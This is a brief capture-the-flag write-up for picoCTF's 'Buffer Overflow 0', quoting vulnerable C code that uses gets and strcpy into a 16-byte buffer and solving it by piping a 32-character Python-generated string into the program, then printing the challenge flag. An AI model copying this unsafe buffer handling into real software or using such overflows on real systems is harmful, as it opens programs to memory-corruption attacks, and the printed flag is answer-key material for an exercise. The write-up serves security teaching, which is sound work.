# Buffer Overflow 0

In this challenge we're provided a program and it's source code and meant to exploit it to get the flag. Given the challenge title we can expect how we might do that.

## Solution

We know we will be performing a buffer overflow attack 

If we look at the source (```vuln.c```) we see:

```
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

We might think given this to see what happens if we pass a 16 char string but this just prints "The program will exit now" as described in this part of the main function

```
printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
```

Let's use python to try a 32 char string:

```
buf = 'a' * 32
print(buf)
```

Passing the output of this to the program gets the flag!

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}
```
